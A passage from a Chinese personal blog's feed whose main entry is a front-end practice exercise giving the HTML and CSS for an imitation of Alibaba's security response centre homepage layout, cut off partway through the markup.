class="line">				echo $row.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】实战阿里云src页面css模仿基础学习</title>
    <url>/posts/59.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="实战结果页面gif图片"><a href="#实战结果页面gif图片" class="headerlink" title="实战结果页面gif图片"></a>实战结果页面gif图片</h1><p>去我博客园看：<a href="https://www.cnblogs.com/GYLQ/p/15004744.html" target="_blank" rel="noopener">https://www.cnblogs.com/GYLQ/p/15004744.html</a></p>
<h2 id="阿里云src首页模仿完整代码（500行左右）"><a href="#阿里云src首页模仿完整代码（500行左右）" class="headerlink" title="阿里云src首页模仿完整代码（500行左右）"></a>阿里云src首页模仿完整代码（500行左右）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>阿里安全响应中心<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">	*&#123;</span><br><span class="line">		padding: 0px;</span><br><span class="line">		margin: 0px;</span><br><span class="line">	&#125;</span><br><span class="line">		body&#123;</span><br><span class="line">			font-family: Helvetica Neue For Number,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Helvetica Neue,Helvetica,Arial,sans-serif;;</span><br><span class="line">			font-size: 13px;</span><br><span class="line"><span class="css">			<span class="selector-tag">background-color</span>: <span class="selector-id">#fff</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.login-box</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">background-color</span>: <span class="selector-id">#ededed</span>;</span></span><br><span class="line">			height: 34px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.login-content</span>&#123;</span></span><br><span class="line">			margin-right: 120px;</span><br><span class="line">			text-align: right;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.login-content</span> <span class="selector-tag">span</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line">			text-decoration: none;</span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#000</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.login-content</span> <span class="selector-tag">span</span>&#123;</span></span><br><span class="line">			line-height: 34px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.change-lange</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#000000</span>;</span></span><br><span class="line">			text-decoration: none;</span><br><span class="line"><span class="css">			<span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#999</span>;</span></span><br><span class="line">			border-radius: 3px;</span><br><span class="line">			padding: 0px 10px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.change-lange</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#FFF</span>;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">background-color</span>: <span class="selector-id">#108ee9</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.logo</span>&#123;</span></span><br><span class="line">			float: left;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.logo</span> <span class="selector-tag">img</span>&#123;</span></span><br><span class="line">			margin-left: 70px;</span><br><span class="line">			margin-top: 10px;</span><br><span class="line">			width: 139px;</span><br><span class="line">			height: 45px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.first-menu</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#000000</span>;</span></span><br><span class="line">			text-decoration: none;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.first-menu</span>&#123;</span></span><br><span class="line">			font-size: 16px;</span><br><span class="line">			list-style: none;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.first-menu</span> <span class="selector-tag">li</span>&#123;</span></span><br><span class="line">			line-height: 70px;</span><br><span class="line">			padding: 0px 16px;</span><br><span class="line">			float: left;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.first-menu</span> <span class="selector-tag">li</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">border-bottom</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#108ee9</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.nav</span>&#123;</span></span><br><span class="line">			height: 70px;</span><br><span class="line"><span class="css">			<span class="selector-tag">border-bottom</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#dede</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.submit-LAI</span>&#123;</span></span><br><span class="line">			float: right;</span><br><span class="line">			line-height: 70px;</span><br><span class="line">			margin-right: 120px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.submit-LAI</span> <span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">background</span>: <span class="selector-id">#008aff</span>;</span></span><br><span class="line">    		padding-left: 15px;</span><br><span class="line">    		padding-right: 15px;</span><br><span class="line">   			height: 46px;</span><br><span class="line">   		 	line-height: 46px;</span><br><span class="line">   	 		display: inline-block;</span><br><span class="line">   			margin-top: 12px;</span><br><span class="line"><span class="css">   			<span class="selector-tag">color</span>: <span class="selector-id">#fff</span>;</span></span><br><span class="line">   		 	text-align: center;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.cl</span>&#123;</span></span><br><span class="line">			clear: both;</span><br><span class="line">			padding-bottom: 3px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.home-page</span>&#123;</span></span><br><span class="line">			text-align: center;</span><br><span class="line"><span class="css">   			<span class="selector-tag">background</span>: <span class="selector-id">#000f1c</span>;</span></span><br><span class="line"><span class="css">    		<span class="selector-tag">background</span>: <span class="selector-tag">linear-gradient</span>(75<span class="selector-tag">deg</span>,<span class="selector-id">#000b14</span>,<span class="selector-id">#00213c</span>);</span></span><br><span class="line">    		position: relative;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.home-page</span> <span class="selector-tag">img</span>&#123;</span></span><br><span class="line">			max-width: 1440px;</span><br><span class="line">			width: 100%;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.sub-vulnerability</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line">			display: block;</span><br><span class="line">			width: 100px;</span><br><span class="line"><span class="css">			<span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#aaa</span>;</span></span><br><span class="line">			text-decoration: none;</span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#aaa</span>;</span></span><br><span class="line">			text-align: center;</span><br><span class="line">			padding: 10px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.sub-vulnerability</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">background</span>: <span class="selector-id">#108ee9</span>;</span></span><br><span class="line"><span class="css">    		<span class="selector-tag">color</span>: <span class="selector-id">#fff</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.sub-vulnerability</span>&#123;</span></span><br><span class="line">			position: absolute;</span><br><span class="line">			top: 60%;</span><br><span class="line">			left: 12%;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.tips</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">background</span>: <span class="selector-id">#7a7a7a</span>;</span></span><br><span class="line">			height: 45px;</span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#000f1c</span>;</span></span><br><span class="line">			font-size: 14px;</span><br><span class="line">			margin-bottom: 30px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.tips</span> <span class="selector-tag">span</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line">			text-decoration: none;</span><br><span class="line">			line-height: 45px;</span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#000f1c</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.tips</span> <span class="selector-tag">span</span>&#123;</span></span><br><span class="line">			display: inline-block;</span><br><span class="line">			width: 300px;</span><br><span class="line">			text-align: center;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.main-left</span>&#123;</span></span><br><span class="line">			width: 900px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.security-title</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">border-bottom</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#dedede</span>;</span></span><br><span class="line">			height: 40px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.security-title</span> <span class="selector-tag">h3</span>&#123;</span></span><br><span class="line">			font-weight: normal;</span><br><span class="line">			float: left;</span><br><span class="line">			font-size: 18px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.security-title</span> <span class="selector-tag">h4</span>&#123;</span></span><br><span class="line">			font-weight: normal;</span><br><span class="line">			float: right;</span><br><span class="line">			font-size: 14px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.security-title</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#008aff</span>;</span></span><br><span class="line">			text-decoration: none;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.main-box</span>&#123;</span></span><br><span class="line">			margin: 0px 35px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.logs</span>&#123;</span></span><br><span class="line">			clear: both;</span><br><span class="line">			padding-top: 20px;</span><br><span class="line">			height: 180px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.logs</span> <span class="selector-tag">img</span>&#123;</span></span><br><span class="line">			float: left;</span><br><span class="line">			width: 216px;</span><br><span class="line">			height: 162px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.logs-title</span>&#123;</span></span><br><span class="line">			height: 120px;</span><br><span class="line">			width: 600px;</span><br><span class="line">			padding: 20px 5px;</span><br><span class="line">			</span><br><span class="line">			float: left;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.logs-title</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">box-shadow</span>: 1<span class="selector-tag">px</span> 1<span class="selector-tag">px</span> 1<span class="selector-tag">px</span> <span class="selector-id">#999</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.logs-title</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line">			font-size: 20px;</span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#000</span>;</span></span><br><span class="line">			text-decoration: none;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.logs-data</span>,<span class="selector-class">.logs-keywords</span>&#123;</span></span><br><span class="line">			display: block;</span><br><span class="line">			clear: both;</span><br><span class="line">			font-size: 12px;</span><br><span class="line">			margin-top: 20px;</span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#73808c</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.logs-keywords</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#999</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.border-logs</span>&#123;</span></span><br><span class="line">			clear: both;</span><br><span class="line"><span class="css">			<span class="selector-tag">border-bottom</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#dedede</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.list</span>&#123;</span></span><br><span class="line">			margin-top: 20px;</span><br><span class="line">			margin: 20px 5px 0px 5px;</span><br><span class="line">			float: left;</span><br><span class="line">			width: 290px;</span><br><span class="line">			height: 215px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.list</span> <span class="selector-tag">img</span>&#123;</span></span><br><span class="line">			width: 227px;</span><br><span class="line">			height: 145px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.name</span>&#123;</span></span><br><span class="line">			font-size: 20px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.list</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">box-shadow</span>: 1<span class="selector-tag">px</span> 1<span class="selector-tag">px</span> 1<span class="selector-tag">px</span> <span class="selector-id">#dedede</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.main-left</span>,<span class="selector-class">.main-right</span>&#123;</span></span><br><span class="line">			float: left;</span><br><span class="line">			margin-left: 90px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.main-right</span>&#123;</span></span><br><span class="line">			margin-left: 20px;</span><br><span class="line">			width: 400px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.list-tips</span>&#123;</span></span><br><span class="line">			margin: 15px 0px 20px 0px;</span><br><span class="line">			list-style: none;</span><br><span class="line">			line-height: 30px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.list-tips</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line">			text-decoration: none;</span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#666</span>;</span></span><br><span class="line">			font-size: 14px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.list-tips-date</span>&#123;</span></span><br><span class="line">			float: right;</span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#999</span>;</span></span><br><span class="line">			font-size: 12px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.src-table</span>&#123;</span></span><br><span class="line">			border-spacing: 0;</span><br><span class="line">			font-size: 12px;</span><br><span class="line">			width: 400px;</span><br><span class="line">			text-align: left;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.src-table</span> <span class="selector-tag">tr</span>&gt;<span class="selector-tag">th</span>&#123;</span></span><br><span class="line">			font-weight: normal;</span><br><span class="line"><span class="css">			<span class="selector-tag">background</span>: <span class="selector-id">#f1f1f1</span>;</span></span><br><span class="line">			padding: 16px 8px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.src-table</span> <span class="selector-tag">tr</span>&gt;<span class="selector-tag">td</span>&#123;</span></span><br><span class="line">			padding: 16px 8px;</span><br><span class="line"><span class="css">			<span class="selector-tag">border-bottom</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#e9e9e9</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.tops-index</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">background</span>: <span class="selector-id">#008aff</span>;</span></span><br><span class="line">			width: 22px;</span><br><span class="line">    		height: 22px;</span><br><span class="line">   			line-height: 22px;</span><br><span class="line">  			display: inline-block;</span><br><span class="line">   			text-align: center;</span><br><span class="line"><span class="css">    		<span class="selector-tag">color</span>: <span class="selector-id">#fff</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.tops-last</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">background</span>: <span class="selector-id">#b9dfff</span>;</span></span><br><span class="line">			width: 22px;</span><br><span class="line">    		height: 22px;</span><br><span class="line">   			line-height: 22px;</span><br><span class="line">  			display: inline-block;</span><br><span class="line">   			text-align: center;</span><br><span class="line"><span class="css">    		<span class="selector-tag">color</span>: <span class="selector-id">#fff</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.main-bottom</span>&#123;</span></span><br><span class="line">			clear: both;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.about-us-title</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">border-bottom</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#dedede</span>;</span></span><br><span class="line">			height: 40px;</span><br><span class="line">			margin: 0px 80px 0px 80px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.about-us-title</span> <span class="selector-tag">h3</span>&#123;</span></span><br><span class="line">			font-weight: normal;</span><br><span class="line">			float: left;</span><br><span class="line">			font-size: 18px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.about-alibaba</span>&#123;</span></span><br><span class="line">			font-size: 14px;</span><br><span class="line">			margin-top: 20px;</span><br><span class="line">			padding: 0px 80px 0px 80px;</span><br><span class="line">			text-align: left;</span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#666</span>;</span></span><br><span class="line">			line-height: 30px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-id">#footer</span>&#123;</span></span><br><span class="line">			height: 370px;</span><br><span class="line">			margin-top: 90px;</span><br><span class="line">			font-size: 14px;</span><br><span class="line"><span class="css">    		<span class="selector-tag">background</span>: <span class="selector-id">#262a2e</span>;</span></span><br><span class="line"><span class="css">    		<span class="selector-tag">color</span>: <span class="selector-id">#fff</span>;</span></span><br><span class="line">    		padding: 30px 90px 0px 90px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.contact-me</span> <span class="selector-tag">h3</span>&#123;</span></span><br><span class="line">			font-weight: normal;</span><br><span class="line">			margin-left: 100px;</span><br><span class="line">			font-size: 18px;</span><br><span class="line"><span class="css">   			<span class="selector-tag">color</span>: <span class="selector-id">#fff</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.ab-email</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#fff</span>;</span></span><br><span class="line">			text-decoration: none;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.ab-email</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#108ee9</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.pgp</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#fff</span>;</span></span><br><span class="line">			text-decoration: none;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.pgp</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#108ee9</span>;</span></span><br><span class="line">			text-decoration: underline;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.ab-email</span>,<span class="selector-class">.pgp</span>,<span class="selector-class">.src-ww</span>,<span class="selector-class">.src-qq</span>,<span class="selector-class">.first-new</span>,<span class="selector-class">.news-t</span>&#123;</span></span><br><span class="line">			margin-left: 100px;</span><br><span class="line">			margin-top: 20px;</span><br><span class="line">			font-size: 14px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.news-pic</span>&#123;</span></span><br><span class="line">			margin-left: 150px;</span><br><span class="line">			text-align: center;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.news-t</span>&#123;</span></span><br><span class="line">			text-align: center;</span><br><span class="line">			padding-left: 50px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.footer-left</span>,<span class="selector-class">.footer-right</span>&#123;</span></span><br><span class="line">			float: left;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.news-pic</span> <span class="selector-tag">img</span>&#123;</span></span><br><span class="line">			width: 126px;</span><br><span class="line">			height: 126px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.list-news</span>&#123;</span></span><br><span class="line">			float: left;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.border-bottom</span>&#123;</span></span><br><span class="line">			clear: both;</span><br><span class="line"><span class="css">			<span class="selector-tag">border-bottom</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#4c545a</span>;</span></span><br><span class="line">			padding-top: 30px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.xieyi</span>&#123;</span></span><br><span class="line">			    padding-bottom: 20px;</span><br><span class="line">    			padding-top: 20px;</span><br><span class="line">   				font-size: 12px;</span><br><span class="line"><span class="css">   				<span class="selector-tag">color</span>: <span class="selector-id">#4c545a</span>;</span></span><br><span class="line">   				text-align: center;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"header"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-box"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-content"</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span>丨<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">a</span>&gt;</span>丨<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"change-lange"</span>&gt;</span>EN<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"nav"</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"logo"</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://192.168.0.111/img/logo.png"</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"first-menu"</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>线上活动<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>线下活动<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>贡献榜<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>公告<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>阿里云安全动态<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>礼品兑换<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>全球合作<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"submit-LAI"</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>提交漏洞/情报<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cl"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"home-page"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://img.alicdn.com/tfs/TB1JT.EX29TBuNjy0FcXXbeiFXa-1440-620.png"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"sub-vulnerability"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>提交漏洞/情报<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span 